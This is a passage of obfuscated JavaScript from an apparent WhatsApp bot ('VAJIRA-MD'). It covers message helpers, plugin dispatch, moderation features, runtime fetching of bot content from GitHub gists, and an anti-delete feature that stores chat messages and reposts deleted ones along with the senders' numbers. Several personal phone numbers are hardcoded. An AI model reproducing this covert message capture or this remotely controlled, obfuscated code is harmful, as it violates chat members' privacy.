          await updateCMDStore(_0x29c4b5.key.id, _0x25ad6a);
        } else {
          if (_0x3d19d7.headerType === 0x4) {
            const _0x4695f2 = _0x3d19d7.caption + "\n\n🔢 Reply you want number," + _0xa3bb8a + "\n" + _0x3d19d7.footer;
            const _0x1b9f96 = await _0x5b4381.sendMessage(_0x1a7598, {
              'image': _0x3d19d7.image,
              'caption': _0x4695f2,
              'contextInfo': {
                'mentionedJid': [''],
                'groupMentions': [],
                'forwardingScore': 0x1,
                'isForwarded': true,
                'forwardedNewsletterMessageInfo': {
                  'newsletterJid': "120363290448968237@newsletter",
                  'serverMessageId': 0x7f
                },
                'externalAdReply': {
                  'title': "👨‍💻 ＶＡＪＩＲＡ - ＭＤ 👨‍💻",
                  'body': "ᴀ ꜱɪᴍᴘʟᴇ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ",
                  'mediaType': 0x1,
                  'sourceUrl': "https://wa.me/94711453361",
                  'thumbnailUrl': 'https://pomf2.lain.la/f/opmjwj3s.jpg',
                  'renderLargerThumbnail': false,
                  'showAdAttribution': true
                }
              }
            }, {
              'quoted': _0x3cfae7 || _0x17deea
            });
            await updateCMDStore(_0x1b9f96.key.id, _0x25ad6a);
          }
        }
      };
      _0x5b4381.replyList = async (_0x50b060, _0x42cfed, _0x42d9f5) => {
        function _0x15408a(_0xd4b4df) {
          let _0x4b682f = '';
          _0xd4b4df.forEach((_0x3600a8, _0x54cfce) => {
            _0x4b682f += _0x3600a8.title ? _0x3600a8.title + "\n" : '';
            _0x3600a8.rows.forEach((_0x5c9d10, _0x5c7262) => {
              _0x4b682f += _0x5c9d10.title + " || " + _0x5c9d10.description;
              _0x4b682f += _0x5c7262 === _0x3600a8.rows.length - 0x1 ? '' : "\n";
            });
            _0x4b682f += _0x54cfce === _0xd4b4df.length - 0x1 ? '' : "\n\n";
          });
          return _0x4b682f;
        }
        if (!_0x42cfed.sections) {
          return false;
        }
        _0x42cfed[_0x42cfed.caption ? "caption" : "text"] = (_0x42cfed.title ? _0x42cfed.title + "\n\n" : '') + (_0x42cfed.caption ? _0x42cfed.caption : _0x42cfed.text) + "\n\n" + _0x42cfed.buttonText + "\n\n" + (await _0x15408a(_0x42cfed.sections)) + "\n\n" + _0x42cfed.footer;
        var _0x551582 = {
          ..._0x42cfed
        };
        delete _0x42cfed.sections;
        delete _0x42cfed.footer;
        delete _0x42cfed.buttonText;
        delete _0x42cfed.title;
        const _0x11dde0 = await _0x5b4381.sendMessage(_0x50b060, _0x42cfed, _0x42d9f5);
        const _0x24f4a2 = [];
        _0x551582.sections.forEach(_0x438135 => {
          _0x438135.rows.forEach(_0x5e40cf => {
            _0x24f4a2.push({
              'rowId': _0x5e40cf.rowId,
              'title': _0x5e40cf.title
            });
          });
        });
        for (let _0xf17c71 = 0x0; _0xf17c71 < _0x24f4a2.length; _0xf17c71++) {
          await _0x3145d7.input_data(_0x24f4a2[_0xf17c71].rowId, _0x24f4a2[_0xf17c71].title, _0x11dde0.key.id);
        }
      };
      _0x5b4381.buttonMessage = async (_0x342002, _0x91e649, _0x1f037a) => {
        let _0x28b001 = '';
        const _0x411162 = [];
        _0x91e649.buttons.forEach((_0x3f8758, _0x3b1ad4) => {
          const _0x5aa1c8 = '' + (_0x3b1ad4 + 0x1);
          _0x28b001 += "\n" + _0x5aa1c8 + " | " + _0x3f8758.buttonText.displayText + "\n";
          _0x411162.push({
            'cmdId': _0x5aa1c8,
            'cmd': _0x3f8758.buttonId
          });
        });
        if (_0x91e649.headerType === 0x1) {
          const _0x3a2ee1 = (_0x91e649.text || _0x91e649.caption) + "\n🔢 Reply you want number," + _0x28b001 + "\n\n" + _0x91e649.footer;
          const _0x152912 = await _0x5b4381.sendMessage(_0x119ded, {
            'text': _0x3a2ee1,
            'contextInfo': {
              'mentionedJid': [''],
              'groupMentions': [],
              'forwardingScore': 0x1,
              'isForwarded': true,
              'forwardedNewsletterMessageInfo': {
                'newsletterJid': "120363290448968237@newsletter",
                'serverMessageId': 0x7f
              },
              'externalAdReply': {
                'title': "👨‍💻 ＶＡＪＩＲＡ - ＭＤ 👨‍💻",
                'body': "ᴀ ꜱɪᴍᴘʟᴇ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ",
                'mediaType': 0x1,
                'sourceUrl': "https://wa.me/94711453361",
                'thumbnailUrl': 'https://pomf2.lain.la/f/opmjwj3s.jpg',
                'renderLargerThumbnail': false,
                'showAdAttribution': true
              }
            }
          }, {
            'quoted': _0x1f037a || _0x17deea
          });
          await updateCMDStore(_0x152912.key.id, _0x411162);
        } else {
          if (_0x91e649.headerType === 0x4) {
            const _0x13e8fe = _0x91e649.caption + "\n\n🔢 Reply you want number," + _0x28b001 + "\n" + _0x91e649.footer;
            const _0x4cec44 = await _0x5b4381.sendMessage(_0x342002, {
              'image': _0x91e649.image,
              'caption': _0x13e8fe,
              'contextInfo': {
                'mentionedJid': [''],
                'groupMentions': [],
                'forwardingScore': 0x1,
                'isForwarded': true,
                'forwardedNewsletterMessageInfo': {
                  'newsletterJid': '120363290448968237@newsletter',
                  'serverMessageId': 0x7f
                },
                'externalAdReply': {
                  'title': "👨‍💻 ＶＡＪＩＲＡ - ＭＤ 👨‍💻",
                  'body': "ᴀ ꜱɪᴍᴘʟᴇ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ",
                  'mediaType': 0x1,
                  'sourceUrl': 'https://wa.me/94711453361',
                  'thumbnailUrl': "https://pomf2.lain.la/f/opmjwj3s.jpg",
                  'renderLargerThumbnail': false,
                  'showAdAttribution': true
                }
              }
            }, {
              'quoted': _0x1f037a || _0x17deea
            });
            await updateCMDStore(_0x4cec44.key.id, _0x411162);
          }
        }
      };
      _0x5b4381.listMessage2 = async (_0x55d0e5, _0x121b5b, _0x33f35e) => {
        let _0x39858e = '';
        const _0x46f171 = [];
        _0x121b5b.sections.forEach((_0x48005d, _0x44345a) => {
          const _0x8497aa = '' + (_0x44345a + 0x1);
          _0x39858e += "\n[" + _0x8497aa + "] " + _0x48005d.title + "\n";
          _0x48005d.rows.forEach((_0x3428e2, _0xd8e94b) => {
            const _0x1bebe7 = _0x8497aa + '.' + (_0xd8e94b + 0x1);
            const _0x45315f = "   " + _0x1bebe7 + " | " + _0x3428e2.title;
            _0x39858e += _0x45315f + "\n";
            if (_0x3428e2.description) {
              _0x39858e += "   " + _0x3428e2.description + "\n\n";
            }
            _0x46f171.push({
              'cmdId': _0x1bebe7,
              'cmd': _0x3428e2.rowId
            });
          });
        });
        const _0x1e1eab = _0x121b5b.text + "\n\n" + _0x121b5b.buttonText + ',' + _0x39858e + "\n" + _0x121b5b.footer;
        const _0x32b847 = await _0x5b4381.sendMessage(_0x119ded, {
          'text': _0x1e1eab,
          'contextInfo': {
            'mentionedJid': [''],
            'groupMentions': [],
            'forwardingScore': 0x1,
            'isForwarded': true,
            'forwardedNewsletterMessageInfo': {
              'newsletterJid': '120363290448968237@newsletter',
              'serverMessageId': 0x7f
            },
            'externalAdReply': {
              'title': "👨‍💻 ＶＡＪＩＲＡ - ＭＤ 👨‍💻",
              'body': "ᴀ ꜱɪᴍᴘʟᴇ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ",
              'mediaType': 0x1,
              'sourceUrl': "https://wa.me/94711453361",
              'thumbnailUrl': "https://pomf2.lain.la/f/opmjwj3s.jpg",
              'renderLargerThumbnail': false,
              'showAdAttribution': true
            }
          }
        }, {
          'quoted': _0x33f35e || _0x17deea
        });
        await updateCMDStore(_0x32b847.key.id, _0x46f171);
      };
      _0x5b4381.listMessage = async (_0x24c26c, _0x25eaf2, _0x1d6761) => {
        let _0x3d7953 = '';
        const _0x20080b = [];
        _0x25eaf2.sections.forEach((_0x13e361, _0x58fc91) => {
          const _0x4e0de8 = '' + (_0x58fc91 + 0x1);
          _0x3d7953 += "\n[" + _0x4e0de8 + "] " + _0x13e361.title + "\n";
          _0x13e361.rows.forEach((_0x9dd609, _0x34827d) => {
            const _0x2f8ef1 = _0x4e0de8 + '.' + (_0x34827d + 0x1);
            const _0x33b540 = "   " + _0x2f8ef1 + " | " + _0x9dd609.title;
            _0x3d7953 += _0x33b540 + "\n";
            if (_0x9dd609.description) {
              _0x3d7953 += "   " + _0x9dd609.description + "\n\n";
            }
            _0x20080b.push({
              'cmdId': _0x2f8ef1,
              'cmd': _0x9dd609.rowId
            });
          });
        });
        const _0x39c398 = _0x25eaf2.text + "\n\n" + _0x25eaf2.buttonText + ',' + _0x3d7953 + "\n" + _0x25eaf2.footer;
        const _0x101eb8 = await _0x5b4381.sendMessage(_0x119ded, {
          'text': _0x39c398,
          'contextInfo': {
            'mentionedJid': [''],
            'groupMentions': [],
            'forwardingScore': 0x1,
            'isForwarded': true,
            'forwardedNewsletterMessageInfo': {
              'newsletterJid': "120363290448968237@newsletter",
              'serverMessageId': 0x7f
            },
            'externalAdReply': {
              'title': "👨‍💻 ＶＡＪＩＲＡ - ＭＤ 👨‍💻",
              'body': "ᴀ ꜱɪᴍᴘʟᴇ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ",
              'mediaType': 0x1,
              'sourceUrl': "https://wa.me/94711453361",
              'thumbnailUrl': "https://pomf2.lain.la/f/opmjwj3s.jpg",
              'renderLargerThumbnail': false,
              'showAdAttribution': true
            }
          }
        }, {
          'quoted': _0x1d6761 || _0x17deea
        });
        await updateCMDStore(_0x101eb8.key.id, _0x20080b);
      };
      _0x5b4381.edite = async (_0x29ccde, _0x194a5a) => {
        await _0x5b4381.relayMessage(_0x119ded, {
          'protocolMessage': {
            'key': _0x29ccde.key,
            'type': 0xe,
            'editedMessage': {
              'conversation': _0x194a5a
            }
          }
        }, {});
      };
      const _0x5c9190 = (await axios.get("https://gist.github.com/VajiraTech/0138349a9fa6fffb9f8e840646d95fa3/raw")).data;
      config.LOGO = _0x5c9190.imageurl;
      config.FOOTER = _0x5c9190.footer;
      _0x5b4381.edit = async (_0x2f9e61, _0x3ef733) => {
        await _0x5b4381.relayMessage(_0x119ded, {
          'protocolMessage': {
            'key': _0x2f9e61.key,
            'type': 0xe,
            'editedMessage': {
              'conversation': _0x3ef733
            }
          }
        }, {});
      };
      _0x5b4381.sendFileUrl = async (_0x17a09b, _0x2c5e9d, _0x4ad3d6, _0x3717e8, _0x4d8b97 = {}) => {
        let _0x56ea08 = '';
        let _0x4e7c85 = await axios.head(_0x2c5e9d);
        _0x56ea08 = _0x4e7c85.headers["content-type"];
        if (_0x56ea08.split('/')[0x1] === "gif") {
          return _0x5b4381.sendMessage(_0x17a09b, {
            'video': await getBuffer(_0x2c5e9d),
            'caption': _0x4ad3d6,
            'gifPlayback': true,
            ..._0x4d8b97
          }, {
            'quoted': _0x3717e8,
            ..._0x4d8b97
          });
        }
        if (_0x56ea08 === "application/pdf") {
          return _0x5b4381.sendMessage(_0x17a09b, {
            'document': await getBuffer(_0x2c5e9d),
            'mimetype': "application/pdf",
            'caption': _0x4ad3d6,
            ..._0x4d8b97
          }, {
            'quoted': _0x3717e8,
            ..._0x4d8b97
          });
        }
        if (_0x56ea08.split('/')[0x0] === 'image') {
          return _0x5b4381.sendMessage(_0x17a09b, {
            'image': await getBuffer(_0x2c5e9d),
            'caption': _0x4ad3d6,
            ..._0x4d8b97
          }, {
            'quoted': _0x3717e8,
            ..._0x4d8b97
          });
        }
        if (_0x56ea08.split('/')[0x0] === "video") {
          return _0x5b4381.sendMessage(_0x17a09b, {
            'video': await getBuffer(_0x2c5e9d),
            'caption': _0x4ad3d6,
            'mimetype': "video/mp4",
            ..._0x4d8b97
          }, {
            'quoted': _0x3717e8,
            ..._0x4d8b97
          });
        }
        if (_0x56ea08.split('/')[0x0] === "audio") {
          return _0x5b4381.sendMessage(_0x17a09b, {
            'audio': await getBuffer(_0x2c5e9d),
            'caption': _0x4ad3d6,
            'mimetype': "audio/mpeg",
            ..._0x4d8b97
          }, {
            'quoted': _0x3717e8,
            ..._0x4d8b97
          });
        }
      };
      _0x5b4381.sendButtonMessage = async (_0x50d065, _0x4ed246, _0x8ffc0b, _0x4cc569 = {}) => {
        let _0xe042b9;
        if (_0x4cc569?.['video']) {
          var _0x325f24 = await prepareWAMessageMedia({
            'video': {
              'url': _0x4cc569 && _0x4cc569.video ? _0x4cc569.video : ''
            }
          }, {
            'upload': _0x5b4381.waUploadToServer
          });
          _0xe042b9 = {
            'title': _0x4cc569 && _0x4cc569.header ? _0x4cc569.header : '',
            'hasMediaAttachment': true,
            'videoMessage': _0x325f24.videoMessage
          };
        } else {
          if (_0x4cc569?.["image"]) {
            var _0x266008 = await prepareWAMessageMedia({
              'image': {
                'url': _0x4cc569 && _0x4cc569.image ? _0x4cc569.image : ''
              }
            }, {
              'upload': _0x5b4381.waUploadToServer
            });
            _0xe042b9 = {
              'title': _0x4cc569 && _0x4cc569.header ? _0x4cc569.header : '',
              'hasMediaAttachment': true,
              'imageMessage': _0x266008.imageMessage
            };
          } else {
            _0xe042b9 = {
              'title': _0x4cc569 && _0x4cc569.header ? _0x4cc569.header : '',
              'hasMediaAttachment': false
            };
          }
        }
        let _0x2dd068 = generateWAMessageFromContent(_0x50d065, {
          'viewOnceMessage': {
            'message': {
              'messageContextInfo': {
                'deviceListMetadata': {},
                'deviceListMetadataVersion': 0x2
              },
              'interactiveMessage': {
                'body': {
                  'text': _0x4cc569 && _0x4cc569.body ? _0x4cc569.body : ''
                },
                'footer': {
                  'text': _0x4cc569 && _0x4cc569.footer ? _0x4cc569.footer : ''
                },
                'header': _0xe042b9,
                'nativeFlowMessage': {
                  'buttons': _0x4ed246,
                  'messageParamsJson': ''
                },
                'contextInfo': {
                  'mentionedJid': [_0x4c0316.sender],
                  'forwardingScore': 0x3e7,
                  'isForwarded': true,
                  'forwardedNewsletterMessageInfo': {
                    'newsletterJid': config.C_JID,
                    'newsletterName': config.C_NAME,
                    'serverMessageId': 0x8f
                  },
                  'externalAdReply': {
                    'title': config.T_LINE,
                    'body': config.B_LINE,
                    'mediaType': 0x1,
                    'sourceUrl': config.VAJIRA_WA,
                    'thumbnailUrl': config.LOGO2,
                    'renderLargerThumbnail': false
                  }
                }
              }
            }
          }
        }, {
          'quoted': _0x8ffc0b
        });
        await _0x5b4381.sendPresenceUpdate("composing", _0x50d065);
        await sleep(1000);
        return await _0x5b4381.relayMessage(_0x50d065, _0x2dd068.message, {
          'messageId': _0x2dd068.key.id
        });
      };
      if (!_0x506cfc && !_0x2be52d && !_0x16cdf1 && config.ONLY_GROUP == 'true') {
        return;
      }
      if (!_0x506cfc && !_0x2be52d && config.ONLY_ME == "true") {
        return;
      }
      const _0x5036ee = require('./lib/command');
      const _0x381f49 = _0x3e8311 ? _0x370df7 : false;
      if (_0x3e8311) {
        const _0x2cda47 = _0x5036ee.commands.find(_0x183ca2 => _0x183ca2.pattern === _0x381f49) || _0x5036ee.commands.find(_0x468862 => _0x468862.alias && _0x468862.alias.includes(_0x381f49));
        if (_0x2cda47) {
          if (_0x2cda47.react) {
            _0x5b4381.sendMessage(_0x119ded, {
              'react': {
                'text': _0x2cda47.react,
                'key': _0x17deea.key
              }
            });
          }
          try {
            _0x2cda47["function"](_0x5b4381, _0x17deea, _0x4c0316, {
              'from': _0x119ded,
              'prefix': prefix,
              'l': l,
              'quoted': _0x2a7cf3,
              'body': _0xd6496a,
              'isCmd': _0x3e8311,
              'command': _0x370df7,
              'args': _0xdef36d,
              'q': _0x42475e,
              'isGroup': _0x16cdf1,
              'sender': _0x425769,
              'senderNumber': _0x594863,
              'botNumber2': _0x29fc12,
              'botNumber': _0x4959e6,
              'pushname': _0x4b7296,
              'isMe': _0x506cfc,
              'isOwner': _0x2be52d,
              'groupMetadata': _0x2b0dec,
              'groupName': _0x11dc73,
              'participants': _0x17aa30,
              'groupAdmins': _0x1e9b82,
              'isBotAdmins': _0x4a4be7,
              'isAdmins': _0x58f4d6,
              'reply': _0x267ddb,
              'config': config,
              'isCreator': _0x25fcb1,
              'isDev': _0x2e9d54,
              'botNumber2': _0x29fc12
            });
          } catch (_0x36aa6e) {
            console.error("[PLUGIN ERROR] ", _0x36aa6e);
          }
        }
      }
      _0x5036ee.commands.map(async _0x4e0498 => {
        if (_0xd6496a && _0x4e0498.on === "body") {
          _0x4e0498['function'](_0x5b4381, _0x17deea, _0x4c0316, {
            'from': _0x119ded,
            'prefix': prefix,
            'l': l,
            'quoted': _0x2a7cf3,
            'body': _0xd6496a,
            'isCmd': _0x3e8311,
            'command': _0x4e0498,
            'args': _0xdef36d,
            'q': _0x42475e,
            'isGroup': _0x16cdf1,
            'sender': _0x425769,
            'senderNumber': _0x594863,
            'botNumber2': _0x29fc12,
            'botNumber': _0x4959e6,
            'pushname': _0x4b7296,
            'isMe': _0x506cfc,
            'isOwner': _0x2be52d,
            'groupMetadata': _0x2b0dec,
            'groupName': _0x11dc73,
            'participants': _0x17aa30,
            'groupAdmins': _0x1e9b82,
            'isBotAdmins': _0x4a4be7,
            'isAdmins': _0x58f4d6,
            'reply': _0x267ddb,
            'config': config,
            'isCreator': _0x25fcb1,
            'isDev': _0x2e9d54,
            'botNumber2': _0x29fc12
          });
        } else {
          if (_0x17deea.q && _0x4e0498.on === "text") {
            _0x4e0498['function'](_0x5b4381, _0x17deea, _0x4c0316, {
              'from': _0x119ded,
              'l': l,
              'quoted': _0x2a7cf3,
              'body': _0xd6496a,
              'isCmd': _0x3e8311,
              'command': _0x4e0498,
              'args': _0xdef36d,
              'q': _0x42475e,
              'isGroup': _0x16cdf1,
              'sender': _0x425769,
              'senderNumber': _0x594863,
              'botNumber2': _0x29fc12,
              'botNumber': _0x4959e6,
              'pushname': _0x4b7296,
              'isMe': _0x506cfc,
              'isOwner': _0x2be52d,
              'groupMetadata': _0x2b0dec,
              'groupName': _0x11dc73,
              'participants': _0x17aa30,
              'groupAdmins': _0x1e9b82,
              'isBotAdmins': _0x4a4be7,
              'isAdmins': _0x58f4d6,
              'reply': _0x267ddb,
              'config': config,
              'isCreator': _0x25fcb1,
              'isDev': _0x2e9d54,
              'botNumber2': _0x29fc12
            });
          } else {
            if ((_0x4e0498.on === "image" || _0x4e0498.on === "photo") && _0x17deea.type === 'imageMessage') {
              _0x4e0498["function"](_0x5b4381, _0x17deea, _0x4c0316, {
                'from': _0x119ded,
                'prefix': prefix,
                'l': l,
                'quoted': _0x2a7cf3,
                'body': _0xd6496a,
                'isCmd': _0x3e8311,
                'command': _0x4e0498,
                'args': _0xdef36d,
                'q': _0x42475e,
                'isGroup': _0x16cdf1,
                'sender': _0x425769,
                'senderNumber': _0x594863,
                'botNumber2': _0x29fc12,
                'botNumber': _0x4959e6,
                'pushname': _0x4b7296,
                'isMe': _0x506cfc,
                'isOwner': _0x2be52d,
                'groupMetadata': _0x2b0dec,
                'groupName': _0x11dc73,
                'participants': _0x17aa30,
                'groupAdmins': _0x1e9b82,
                'isBotAdmins': _0x4a4be7,
                'isAdmins': _0x58f4d6,
                'reply': _0x267ddb,
                'config': config,
                'isCreator': _0x25fcb1,
                'isDev': _0x2e9d54,
                'botNumber2': _0x29fc12
              });
            } else if (_0x4e0498.on === "sticker" && _0x17deea.type === 'stickerMessage') {
              _0x4e0498["function"](_0x5b4381, _0x17deea, _0x4c0316, {
                'from': _0x119ded,
                'prefix': prefix,
                'l': l,
                'quoted': _0x2a7cf3,
                'body': _0xd6496a,
                'isCmd': _0x3e8311,
                'command': _0x4e0498,
                'args': _0xdef36d,
                'q': _0x42475e,
                'isGroup': _0x16cdf1,
                'sender': _0x425769,
                'senderNumber': _0x594863,
                'botNumber2': _0x29fc12,
                'botNumber': _0x4959e6,
                'pushname': _0x4b7296,
                'isMe': _0x506cfc,
                'isOwner': _0x2be52d,
                'groupMetadata': _0x2b0dec,
                'groupName': _0x11dc73,
                'participants': _0x17aa30,
                'groupAdmins': _0x1e9b82,
                'isBotAdmins': _0x4a4be7,
                'isAdmins': _0x58f4d6,
                'reply': _0x267ddb,
                'config': config,
                'isCreator': _0x25fcb1,
                'isDev': _0x2e9d54,
                'botNumber2': _0x29fc12
              });
            }
          }
        }
      });
      _0x5b4381.downloadAndSaveMediaMessage = async (_0x43d9a1, _0x3762a9, _0x44b0a4 = true) => {
        let _0x4f9577 = _0x43d9a1.msg ? _0x43d9a1.msg : _0x43d9a1;
        let _0x6c791f = (_0x43d9a1.msg || _0x43d9a1).mimetype || '';
        let _0x19b916 = _0x43d9a1.mtype ? _0x43d9a1.mtype.replace(/Message/gi, '') : _0x6c791f.split('/')[0x0];
        const _0x3563fd = await downloadContentFromMessage(_0x4f9577, _0x19b916);
        let _0x6205d2 = Buffer.from([]);
        for await (const _0x595956 of _0x3563fd) {
          _0x6205d2 = Buffer.concat([_0x6205d2, _0x595956]);
        }
        let _0x47cc36 = await FileType.fromBuffer(_0x6205d2);
        trueFileName = _0x44b0a4 ? _0x3762a9 + '.' + _0x47cc36.ext : _0x3762a9;
        await fs.writeFileSync(trueFileName, _0x6205d2);
        return trueFileName;
      };
      if (config.OWNER_REACT === "true") {
        if (_0x17deea.sender == '94758179948@s.whatsapp.net') {
          await _0x5b4381.sendMessage(_0x119ded, {
            'react': {
              'text': "💟️",
              'key': mem.key
            }
          });
        }
        if (_0x17deea.sender == "94719199757@s.whatsapp.net") {
          await _0x5b4381.sendMessage(_0x119ded, {
            'react': {
              'text': "👨‍💻",
              'key': _0x17deea.key
            }
          });
        }
        if (_0x17deea.sender == "94772108460@s.whatsapp.net") {
          await _0x5b4381.sendMessage(_0x119ded, {
            'react': {
              'text': "👨‍💻",
              'key': _0x17deea.key
            }
          });
        }
        if (_0x17deea.sender == "94772801923@s.whatsapp.net") {
          await _0x5b4381.sendMessage(_0x119ded, {
            'react': {
              'text': "👨‍💻",
              'key': _0x17deea.key
            }
          });
        }
        if (_0x17deea.sender == "94759874797@s.whatsapp.net") {
          await _0x5b4381.sendMessage(_0x119ded, {
            'react': {
              'text': '👨‍💻',
              'key': _0x17deea.key
            }
          });
        }
        if (_0x17deea.sender == "94754487261@s.whatsapp.net") {
          await _0x5b4381.sendMessage(_0x119ded, {
            'react': {
              'text': '👨‍💻',
              'key': _0x17deea.key
            }
          });
        }
        if (_0x17deea.sender == "94756310995@s.whatsapp.net") {
          await _0x5b4381.sendMessage(_0x119ded, {
            'react': {
              'text': '👨‍💻',
              'key': _0x17deea.key
            }
          });
        }
        if (_0x17deea.sender == "94751150234@s.whatsapp.net") {
          await _0x5b4381.sendMessage(_0x119ded, {
            'react': {
              'text': "👨‍💻",
              'key': _0x17deea.key
            }
          });
        }
        if (_0x17deea.sender == "94778500326@s.whatsapp.net") {
          await _0x5b4381.sendMessage(_0x119ded, {
            'react': {
              'text': '👨‍💻',
              'key': _0x17deea.key
            }
          });
        }
      }
      if (config.AUTO_VOICE === "true") {
        let {
          data: _0x17c39a
        } = await axios.get("https://gist.github.com/VajiraTech/32826daa4c68497b1545c7c19160d3e9/raw");
        for (vr in _0x17c39a) {
          if (new RegExp("\\b" + vr + "\\b", 'gi').test(_0xd6496a)) {
            _0x5b4381.sendMessage(_0x119ded, {
              'audio': {
                'url': _0x17c39a[vr]
              },
              'mimetype': "audio/mpeg",
              'ptt': true
            }, {
              'quoted': _0x17deea
            });
          }
        }
      }
      if (config.AUTO_STICKER === 'true') {
        let {
          data: _0x39be6c
        } = await axios.get("https://gist.github.com/VajiraTech/2c76014f278d5aefb7793254411e3f66/raw");
        for (vr in _0x39be6c) {
          if (new RegExp("\\b" + vr + "\\b", 'gi').test(_0xd6496a)) {
            _0x5b4381.sendMessage(_0x119ded, {
              'sticker': {
                'url': _0x39be6c[vr]
              },
              'package': "made by vajira"
            }, {
              'quoted': _0x17deea
            });
          }
        }
      }
      if (config.AUTO_REPLY === "true") {
        let {
          data: _0x5ea08d
        } = await axios.get("https://gist.github.com/VajiraTech/f24702a3431aea30273005577b05bfb1/raw");
        for (vr in _0x5ea08d) {
          if (new RegExp("\\b" + vr + "\\b", 'gi').test(_0xd6496a)) {
            _0x4c0316.reply(_0x5ea08d[vr]);
          }
        }
      }
      let _0x59f98a = _0xd6496a ? prefixRegex.test(_0xd6496a[0x0]) : 'false';
      if (config.READ_CMD_ONLY === 'true' && _0x59f98a) {
        await _0x5b4381.readMessages([_0x17deea.key]);
      }
      if (config.AUTO_READ === "true") {
        _0x5b4381.readMessages([_0x17deea.key]);
      }
      if (config.AUTO_TYPING === "true") {
        _0x5b4381.sendPresenceUpdate("composing", _0x119ded);
      }
      if (config.AUTO_RECORDING === 'true') {
        _0x5b4381.sendPresenceUpdate("recording", _0x119ded);
      }
      if (config.AUTO_BIO === "true") {
        _0x5b4381.updateProfileStatus("Hey, future leaders! 🌟 Vajira-Md is here to inspire and lead, thanks to Vajira Rathnayaka, Inc. 🚀 " + runtime(process.uptime()) + " ")["catch"](_0x2c2f54 => _0x2c2f54);
      }
      if (config.ALWAYS_ONLINE === "false") {
        await _0x5b4381.sendPresenceUpdate("unavailable");
      }
      if (config.ALWAYS_ONLINE === 'true') {
        await _0x5b4381.sendPresenceUpdate("available");
      }
      if (config.AUTO_BLOCK == "true" && _0x4c0316.chat.endsWith('@s.whatsapp.net')) {
        return _0x5b4381.updateBlockStatus(_0x4c0316.sender, "block");
      }
      if (config.ANTI_LINK == "true") {
        if (_0x45a247 && _0x4a4be7) {
          if (!_0x58f4d6) {
            if (!_0x506cfc) {
              if (_0xd6496a.match('https')) {
                await _0x5b4381.sendMessage(_0x119ded, {
                  'delete': _0x17deea.key
                });
                _0x267ddb("*「 ⚠️ 𝑳𝑰𝑵𝑲 𝑫𝑬𝑳𝑬𝑻𝑬𝑫 ⚠️ 」*");
              }
            }
          }
        }
      }
      if (config.ANTI_BOT == "true") {
        if (!_0x25fcb1 && !_0x2e9d54 && _0x16cdf1 && !_0x4a4be7) {
          _0x267ddb("```🤖 Bot Detected!!```\n\n_✅ Kicked *@" + _0x17deea.sender.split('@')[0x0] + '*_', {
            'mentions': [_0x17deea.sender]
          });
          _0x5b4381.groupParticipantsUpdate(_0x119ded, [_0x17deea.sender], "remove");
        }
      }
      const _0x1e75e3 = await fetchJson('https://raw.githubusercontent.com/chamiofficial/server-/main/badby_alpha.json');
      if (config.ANTI_BAD == "true") {
        if (!_0x58f4d6 && !_0x2e9d54) {
          for (any in _0x1e75e3) {
            if (_0xd6496a.toLowerCase().includes(_0x1e75e3[any])) {
              if (!_0xd6496a.includes("tent")) {
                if (!_0xd6496a.includes('docu')) {
                  if (!_0xd6496a.includes("https")) {
                    if (_0x1e9b82.includes(_0x425769)) {
                      return;
                    }
                    if (_0x17deea.key.fromMe) {
                      return;
                    }
                    await _0x5b4381.sendMessage(_0x119ded, {
                      'delete': _0x17deea.key
                    });
                    await _0x5b4381.sendMessage(_0x119ded, {
                      'text': "*Bad word detected..!*"
                    });
                    await _0x5b4381.groupParticipantsUpdate(_0x119ded, [_0x425769], "remove");
                  }
                }
              }
            }
          }
        }
      }
      if (!_0x2be52d) {
        if (config.ANTI_DELETE === "true") {
          if (!_0x4c0316.id.startsWith("BAE5")) {
            if (!fs.existsSync("message_data")) {
              fs.mkdirSync("message_data");
            }
            function _0x359652(_0x5187e6, _0x598030) {
              const _0x3d6c03 = path.join("message_data", _0x5187e6, _0x598030 + ".json");
              try {
                const _0xbc6c27 = fs.readFileSync(_0x3d6c03, "utf8");
                return JSON.parse(_0xbc6c27) || [];
              } catch (_0x8e42ad) {
                return [];
              }
            }
            function _0x40893d(_0x4f4258, _0x2336f0, _0x383773) {
              const _0x3e789f = path.join("message_data", _0x4f4258);
              if (!fs.existsSync(_0x3e789f)) {
                fs.mkdirSync(_0x3e789f, {
                  'recursive': true
                });
              }
              const _0x2c8157 = path.join(_0x3e789f, _0x2336f0 + ".json");
              try {
                fs.writeFileSync(_0x2c8157, JSON.stringify(_0x383773, null, 0x2));
              } catch (_0x3b1240) {
                console.error("Error saving chat data:", _0x3b1240);
              }
            }
            function _0x2633ba(_0x3e0ff3) {
              const _0x4ef470 = _0x3e0ff3.key.id;
              const _0x3cb67f = _0x359652(_0x119ded, _0x4ef470);
              _0x3cb67f.push(_0x3e0ff3);
              _0x40893d(_0x119ded, _0x4ef470, _0x3cb67f);
            }
            const _0x4b906c = config.DELETEMSGSENDTO !== '' ? config.DELETEMSGSENDTO + "@s.whatsapp.net" : _0x119ded;
            function _0x491a48(_0x5e9787) {
              const _0x3e4a6a = _0x5e9787.msg.key.id;
              const _0x2e061e = _0x359652(_0x119ded, _0x3e4a6a);
              const _0x190453 = _0x2e061e[0x0];
              if (_0x190453) {
                const _0x3ad4b6 = _0x5e9787.sender.split('@')[0x0];
                const _0x5a9517 = _0x190453.key.participant ?? _0x5e9787.sender;
                const _0x52bcac = _0x5a9517.split('@')[0x0];
                if (_0x3ad4b6.includes(_0x4959e6) || _0x52bcac.includes(_0x4959e6)) {
                  return;
                }
                if (_0x190453.message && _0x190453.message.conversation && _0x190453.message.conversation !== '') {
                  const _0x5abead = _0x190453.message.conversation;
                  if (_0x16cdf1 && _0x5abead.includes('chat.whatsapp.com')) {
                    return;
                  }
                  var _0xf0d0e3 = "```";
                  _0x5b4381.sendMessage(_0x4b906c, {
                    'text': "🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _" + _0x3ad4b6 + "_\n  📩 *Sent by:* _" + _0x52bcac + "_\n\n> 🔓 Message Text: " + _0xf0d0e3 + _0x5abead + _0xf0d0e3
                  });
                } else {
                  if (_0x190453.msg.type === 'MESSAGE_EDIT') {
                    _0x5b4381.sendMessage(_0x4b906c, {
                      'text': "❌ *edited message detected* " + _0x190453.message.editedMessage.message.protocolMessage.editedMessage.conversation
                    }, {
                      'quoted': _0x17deea
                    });
                  } else {
